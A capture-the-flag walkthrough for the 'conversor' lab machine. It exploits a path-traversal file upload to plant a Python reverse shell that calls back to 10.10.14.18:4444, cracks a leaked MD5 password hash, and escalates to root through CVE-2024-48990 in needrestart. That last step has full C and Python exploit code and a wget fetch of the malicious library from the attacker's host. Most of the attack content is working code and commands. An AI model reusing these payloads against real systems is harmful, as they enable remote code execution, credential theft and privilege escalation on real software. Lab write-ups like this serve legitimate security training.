We start with a TCP nmap scan:

```shell
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Login
|_Requested resource was /login
```

Then a UDP scan for the top 1000 ports but with no success.

We also do a WhatWeb scan:

```shell
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.52 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Ubuntu Linux
	String       : Apache/2.4.52 (Ubuntu) (from server string)

[ Matomo ]
	Matomo is the leading open alternative to Google Analytics
	that gives you full control over your data. Matomo lets you
	easily collect data from websites, apps & the IoT and
	visualise this data and extract insights. Privacy is
	built-in. Matomo was formerly known as Piwik, and is
	developed in PHP.

	Aggressive function available (check plugin file or details).
	Google Dorks: (1)
	Website     : https://matomo.org

[ RedirectLocation ]
	HTTP Server string location. used with http-status 301 and
	302

	String       : /login (from location)

HTTP Headers:
	HTTP/1.1 302 FOUND
	Date: Mon, 15 Dec 2025 21:39:23 GMT
	Server: Apache/2.4.52 (Ubuntu)
	Content-Length: 199
	Location: /login
	Connection: close
	Content-Type: text/html; charset=utf-8

```

Then we scan the directories using gobuster:

```shell
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/about                (Status: 200) [Size: 2842]
/login                (Status: 200) [Size: 722]
/register             (Status: 200) [Size: 726]
/logout               (Status: 302) [Size: 199] [--> /login]
/server-status        (Status: 403) [Size: 278]
/server-status/       (Status: 403) [Size: 278]
/convert              (Status: 405) [Size: 153]
```

And the subdomains using ffuf, but it's difficult since the response size is always changing.

If we create an account at /register and then use the /login route, we are welcomed by a form were we can convert nmap scan from XML and XLST to a more aesthetic format using the /convert endpoint.
There is also XSLT a template we can download:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          h1, h2, h3 {
            text-align: center;
            font-weight: 300;
          }
          .card {
            background: rgba(255, 255, 255, 0.05);
            margin: 30px auto;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 80%;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
          }
          th, td {
            padding: 10px;
            text-align: center;
          }
          th {
            background: rgba(255,255,255,0.1);
            color: #ffcc70;
            font-weight: 600;
            border-bottom: 2px solid rgba(255,255,255,0.2);
          }
          tr:nth-child(even) {
            background: rgba(255,255,255,0.03);
          }
          tr:hover {
            background: rgba(255,255,255,0.1);
          }
          .open {
            color: #00ff99;
            font-weight: bold;
          }
          .closed {
            color: #ff5555;
            font-weight: bold;
          }
          .host-header {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ffd369;
          }
          .ip {
            font-weight: bold;
            color: #00d4ff;
          }
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
              <xsl:if test="hostnames/hostname/@name">
                (<xsl:value-of select="hostnames/hostname/@name"/>)
              </xsl:if>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

Since we are logged in, we try the /server-status page but we still get a 403.

If we visit the /about page, we find a download button that point to the app source code at /static/source_code.tar.gz

If we try to extract it, we get an error:

```shell
tar -xzf source_code.tar.gz

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

If we identify the archive, it tell us it's a .tar, not a .tar.gz:

```
file source_code.tar.gz
source_code.tar.gz: POSIX tar archive (GNU)
```

We need to adjust the arguments in consequence:

```shell
tar -xf source_code.tar.gz
```

This gives us the following files:

```shell
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

The app.py and users.db files are particularly interesting.

If we open the users.db file using sqlite3, we find 2 empty tables:

```sql
.tables
files  users

SELECT * FROM users;

SELECT * FROM files;
```

In `install.md`, we find the following clue:

```

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""

```

If we open app.py, we find the code for the /convert endpoint that use `lxml` which is vulnerable to CVE-2025-6985. Unfortunately, the server seems to have protections (likely XSLTAccessControl)

We also find a file upload path traversal vulnerability:

```python
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  # NO SANITIZATION!
xml_file.save(xml_path)
```

To recap, we have:

- A Path Traversal in filename parameter (no input validation)
- An rbitrary File Write to /scripts/ directory
- A Cron-based Code Execution (automatic within 60 seconds)

To exploit this, we would need to:

- Intercept the POST request to /convert using Burp Suite
- Modify the filename from nmap.xml to ../scripts/shell.py
- Replace the file content with a Python reverse shell
- Start a netcat listener: nc -lvnp 4444
- Execute the malicious POST request
- Wait ≤60 seconds for cron to execute the script

Here is the Burp payload:

```
POST /convert HTTP/1.1
Host: conversor.htb
Content-Length: 717
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://conversor.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBcpfdqSJypzbnoIa
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://conversor.htb/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ.aUCWmA.mEi8i52lyTs0e9GgP7xp3TBsBFI
Connection: keep-alive

------WebKitFormBoundaryBcpfdqSJypzbnoIa
Content-Disposition: form-data; name="xml_file"; filename="../scripts/shell.py"
Content-Type: text/plain

import socket,subprocess,os
s=socket.socket()
s.connect(("10.10.14.18",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
------WebKitFormBoundaryBcpfdqSJypzbnoIa
Content-Disposition: form-data; name="xslt_file"; filename="simple.xslt"
Content-Type: application/xslt+xml

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body>Test</body></html>
  </xsl:template>
</xsl:stylesheet>
------WebKitFormBoundaryBcpfdqSJypzbnoIa--
```

And it worked ! We now have a reverse shell:

```shell
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.37.71] 46828
bash: cannot set terminal process group (4457): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

Now we can look at the users.db inside the server:

```sql
sqlite3 /var/www/conversor.htb/instance/users.db

.tables
files  users

SELECT * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|098f6bcd4621d373cade4e832627b4f6
```

We can identify the hash with namethathash:

```shell
5b5c3ac3a1c897c94caad48e6c71fdec

Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```

Now that we know the hash type, we can try to crack it with hashcat:

```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
```

Now we can connect as fismathack and display the user flag:

```shell
ssh fismathack@conversor.htb

cat user.txt
2936abb855d32318ec34fa57b304035b
```

The next step is to run and upload linpeas:

```shell
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

We can run needrestart as sudo. We just need to find a way to exploit this.

Let's start by listing the command help:

```shell
/usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v		be more verbose
    -q		be quiet
    -m <mode>	set detail level
	e	(e)asy mode
	a	(a)dvanced mode
    -n		set default answer to 'no'
    -c <cfg>	config filename
    -r <mode>	set restart mode
	l	(l)ist only
	i	(i)nteractive restart
	a	(a)utomatically restart
    -b		enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>	override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

Looking online, version 3.7 of needrestart is vulnerable to [CVE-2024-48990](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing).

To exploit this, we need to:

Compile a malicious shared library on our machine and serve it:

```shell
# Step 1: Create the malicious C code
cat << 'EOF' > /tmp/lib.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void pwn() __attribute__((constructor));

void pwn() {
    if(geteuid() == 0) {  // Only execute if we're root
        setuid(0);
        setgid(0);

        // Create SUID bash shell
        system("cp /bin/bash /tmp/rootbash");
        system("chmod u+s /tmp/rootbash");

        // Also create a flag file so we know it ran
        system("touch /tmp/pwned");
    }
}
EOF

# Step 2: Compile it (make sure you're on a Linux x86_64 machine)
gcc -shared -fPIC -o __init__.so /tmp/lib.c

# Step 3: Verify it compiled correctly
file __init__.so
# Should show: ELF 64-bit LSB shared object, x86-64

# Check for the constructor symbol
nm -D __init__.so | grep pwn
# Should show something with 'pwn'

# Step 4: Start a simple HTTP server to transfer
python3 -m http.server 8000
```

Download the malicous library, create a python listener and start the exploit to create a SUID shell on the target machine:

```shell
# Create directory structure
mkdir -p /tmp/malicious/importlib

# Download the .so file from our attack machine
wget http://10.10.14.18:8000/__init__.so -O /tmp/malicious/importlib/__init__.so

# Verify the file transferred correctly
ls -la /tmp/malicious/importlib/__init__.so
file /tmp/malicious/importlib/__init__.so
# Should show: ELF 64-bit LSB shared object, x86-64

# Make it executable (just in case)
chmod +x /tmp/malicious/importlib/__init__.so

# Create the Python waiting script
cat << 'EOF' > /tmp/malicious/exploit.py
import time
import os

print("[*] Exploit running. Waiting for needrestart to be triggered...")
print("[*] In another terminal, run: sudo needrestart")

# Try to import importlib (this will fail but keeps process alive)
while True:
    try:
        import importlib
    except Exception as e:
        pass

    # Check if exploit succeeded
    if os.path.exists("/tmp/rootbash"):
        print("[+] SUCCESS! SUID shell created at /tmp/rootbash")
        print("[+] Run: /tmp/rootbash -p")
        break

    time.sleep(1)
EOF

# Start the exploit
cd /tmp/malicious
PYTHONPATH=/tmp/malicious python3 exploit.py &

# Verify it's running
ps aux | grep exploit.py
```

Run needrestart in another terminal on our target machine, then execute the SUID shell:

```shell
sudo needrestart

# Check if the SUID shell was created
ls -la /tmp/rootbash
# Should show: -rwsr-xr-x ... /tmp/rootbash

# Also check if the flag file exists (proves constructor ran)
ls -la /tmp/pwned

# Execute the SUID shell
/tmp/rootbash -p

# Verify we're root
whoami

# Get the flag
cat /root/root.txt

4768ecc50ae5b7b36d84de17f56e24ac
```
